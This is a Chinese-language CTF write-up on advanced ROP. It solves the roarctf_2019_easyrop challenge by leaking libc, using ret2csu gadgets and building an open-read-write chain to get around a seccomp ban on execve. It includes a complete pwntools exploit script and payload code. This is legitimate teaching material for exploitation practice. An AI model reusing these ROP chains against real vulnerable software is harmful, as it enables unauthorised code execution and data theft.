ROP进阶篇
======

x86-64 下的传参
-----------

前六个参数存于rdi, rsi, rdx, rcx, r8, r9, 第七个参数开始从右至左压入栈中.

File Descriptor
---------------

Linux下, 所有输入输出流都被视为文件,因此有文件描述符(fd)这个概念.  
一个C语言程序初始会打开3个fd  
0 -&gt; stdin  
1 -&gt; stdout  
2 -&gt; stderr

之后打开的文件将会得到下一个可用的fd. 例如,打开一个叫"flag"的文件:  
0 -&gt; stdin  
1 -&gt; stdout  
2 -&gt; stderr  
3 -&gt; "flag"

seccomp
-------

seccomp是一种Linux内核提供的应用程序沙箱机制, 开发者可以通过seccomp禁用一些syscall号. CTF  
中最常见的是禁用 execve , 让攻击者无法顺利getshell.  
然而CTF中最终目的还是getflag. 因此绕过思路一般为orw,Open-Read-Write, 即打开flag文件,将flag读取  
到内存中并最终输出.  
可以用[seccomp-tools](https://github.com/david942j/seccomp-tools)工具来查看程序的沙箱状态.

easyrop
-------

剩下的内容通过这道题目来讲.  
[https://buuoj.cn/login?next=%2Fchallenges%3F#roarctf\_2019\_easyrop](https://buuoj.cn/login?next=%2Fchallenges%3F#roarctf_2019_easyrop)

程序分析
----

先checksec看一下保护, 没有开启PIE和stack canary  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1bca277e72989884282fe4609934e66cce5d1217.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1bca277e72989884282fe4609934e66cce5d1217.png)

顺手再看一下seccomp,

```php
seccomp-tools dump ./roarctf_2019_easyrop
```

可以看到, execve() 这个syscall被禁用了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0dc3837fe48c966789d002af00a2510e648637a3.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0dc3837fe48c966789d002af00a2510e648637a3.png)

程序拖入IDA中, 发现漏洞就是最简单的栈溢出, 我们可以无限制的向 victim\[1032\] 这个数组中写入.

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e5152cf68ef2c29e47943198842c8e107422ac69.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e5152cf68ef2c29e47943198842c8e107422ac69.png)  
其他函数可以不用管,不用逆的东西多看一秒都是浪费生命.

利用思路
----

没有stack canary, 可以直接栈溢出构造rop chain  
禁用了 execve() , 因此使用orw (Open-Read-Write) 获取flag

那么完整思路有了

1. 泄露Libc基地址
2. 打开flag文件, 从中读取内容并输出 (orw)

具体利用
----

看起来很简单,但其实在利用时还有比较多细节要处理.

如何确定溢出的偏移?
----------

仔细看一下处理输入的代码,发现溢出 victim\[\] 数组后会覆盖变量 v9 , 而 v9 是记录输入偏移的变量.  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-454a8bf2076521131adbab4e595baef1da36edb2.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-454a8bf2076521131adbab4e595baef1da36edb2.png)

若想要准确的覆盖返回地址,需要先准确的覆盖 v9 .  
v9 与 victim\[\] 的偏移为0x418, 返回地址与 victim\[\] 的偏移为0x428. 因此我们需要将v9覆盖为0x428,

```php
padding="A"*0x418+"\x28"
```

由于 v9 的值从0x419被覆盖成了0x428,紧接着的下一个字符就会输入到 victim\[0x428\] 的位置,也  
即 main 函数的返回地址.

如何泄露libc
--------

泄露libc的方式很常规,可以参考之前ROP的基础篇.  
输出GOT表中存放的 puts 函数真实地址,以计算libc基地址.

```php
payload = padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(main)
target.sendline(payload)
target.recvuntil("given path.\n\x00")
puts_leak = u64(target.recv(6).ljust(8,'\x00'))
libc_base = puts_leak - libc.sym["puts"]
success("libc_base: "+hex(libc_base))
```

Open-Read-Write
---------------

有了libc基地址,也就有了 open , read 和 write 的地址, 但 read 和 write 都需要控制三个参数, 这该如何  
实现呢? 此处先介绍一种非常常见的技术 ret2csu .

ret2csu
-------

如果想调用需要两三个参数的函数（如 write ），寻找gadgets会十分痛苦。幸运的是，  
在 libc\_csu\_init 函数中 (本题IDA中该函数名为 init )，有一对万能的通用gadgets，也称为ret2csu。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d321b1479a2de8866c4905b5fee92cf4e61b5364.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d321b1479a2de8866c4905b5fee92cf4e61b5364.png)

如图，我们将该gadget分为两部分: p6r;ret 以及mov;...;call. 明显地,这里我们可以控制  
rbx,rbp,r12,r13,r14,r15的值来调用一个指定函数,并指定其前三个参数,即rdi,rsi,rdx的值.

注意: r12传入的是函数的 指针 ,而不是函数自己的地址

最终的ROP构造如下：

```php
ROP = p6r;ret + p64(0) + p64(1) + 函数指针
+ arg1 + arg2 + arg3 + mov;...;call
+ padding of 56 bytes + 返回地址
```

填充56个字节是因为mov;...;call 运行完后，会接着从图中 loc\_401B86 位置运行，我们需要填充7\*8=56  
字节的栈空间。这种利用方式的一个缺点是需要的payload长度较大.

更细节的利用流程如下:

1. 利用 pop rdi;ret 和 pop rsi; pop r15; ret 这两个gadget, 控制 read 的前两个参数 (第三个参数依  
    赖rdx中的值), 将字符 flag\\x00 写到bss段上.
2. 同时将 open 的地址写到bss段上. 如此,我们就有了指向 open 的指针.利用ret2csu调用  
    open("flag",0) , 打开flag文件, 文件的fd会是3.
3. 类似地, 向bss段写入 read 的地址,利用ret2csu调用  
    read(3,buf,size) 将flag写入到bss段上.
4. 类似地, 向bss段写入 write 的地址,利用ret2csu调用  
    write(2,buf,size) 输出flag到 fd:2 ,即 stderr , 成功getflag

完整exp
-----

```php
from pwn import *
import sys
if len(sys.argv) >1 and sys.argv[1] == 'r':
    target = remote("node3.buuoj.cn",27246 )
else:
    #target = process("./roarctf_2019_easyrop")
    target=process("./roarctf_2019_easyrop",env={"LD_PRELOAD":"./libc-2.27.so"})
    if(len(sys.argv)>1) and sys.argv[1]=='g':
    #gdb.attach(target,"b *0x401b2a")
    gdb.attach(target, "b read")
#context.log_level='debug'
#context.update(arch='')
#gdb.attach(target)

elf = ELF("./roarctf_2019_easyrop")
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
libc = ELF("./libc-2.27.so")

pop_rdi=0x401b93
pop_rsi_r15 = 0x401b91
pop_rsp_r13_r14_r15 = 0x401b8d
main = 0x4019f3

# 利用ret2csu生成并返回payload
def ret2csu(functionPtr,arg1,arg2,arg3):
    p6r = 0x401B8A
    movecall = 0x401B70
    payload = p64(p6r) + p64(0)+ p64(1) + p64(functionPtr)
    payload += p64(arg1) + p64(arg2) + p64(arg3)
    payload += p64(movecall)
    payload += "A"*56 # balance the stack
    payload += p64(main) # return to main
    return payload
# 使用read向指定地址写入指定内容
# 这里无法控制输入的size, 即第三个参数rdx
def read2Address(address,content,libc_read):
    target.recvuntil(">> ")
    padding="A"*0x418+"\x28"
    payload = padding
    payload += p64(pop_rdi) + p64(0)
    payload += p64(pop_rsi_r15) + p64(address) + p64(0)
    payload += p64(libc_read) + p64(main)
    target.sendline(payload)
    target.sendline(content)
def pwn():
    target.recvuntil(">> ")
    padding="A"*0x418+"\x28"
    # 泄露libc
    payload = padding + p64(pop_rdi) + p64(puts_got)
    payload += p64(puts_plt) +p64(main)
    target.sendline(payload)
    target.recvuntil("given path.\n\x00")
    puts_leak = u64(target.recv(6).ljust(8,'\x00'))
    libc_base = puts_leak - libc.sym["puts"]
    success("libc_base: "+hex(libc_base))
    # 需要使用 ORW (open-read-write) 来 getflag
    libc_open = libc_base + libc.sym['open']
    libc_read = libc_base + libc.sym['read']
    libc_write = libc_base + libc.sym['write']
    # 将字符串"flag"写入到 (0x6030c0)
    read2Address(0x6030c0,"flag\x00",libc_read)
    # 因为使用ret2csu需要指向open的指针
    # 将open的地址写到0x6030C8
    read2Address(0x6030c8,p64(libc_open),libc_read)
    # open
    target.recvuntil(">> ")
    payload_open = padding + ret2csu(0x6030C8,0x6030c0,0,0)
    target.sendline(payload_open)
    # 将 flag 读取到 0x6030E0
    read2Address(0x6030c8,p64(libc_read),libc_read)
    target.recvuntil(">> ")
    payload_read = padding + ret2csu(0x6030c8,3,0x6030E0,0x30)
    target.sendline(payload_read)
    # 通过stderr输出0x6030E0中存放的flag
    read2Address(0x6030c8,p64(libc_write),libc_read)
    target.recvuntil(">> ")
    payload_write = padding + ret2csu(0x6030c8,2,0x6030E0,0x30)
    target.sendline(payload_write)
    target.interactive()
pwn()
```

另一种做法：
------

泄露出libc基地址后,使用libc中的gadget控制参数,从而无需使用ret2csu, 如  
0x0000000000001b96 : pop rdx ; ret  
写入用于orw的shellcode, 并调用 mprotect 使指定内存可以执行,最后ret2shellcode.

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a689734e47868e7a2c3f8c92d540fa75c915147b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a689734e47868e7a2c3f8c92d540fa75c915147b.png)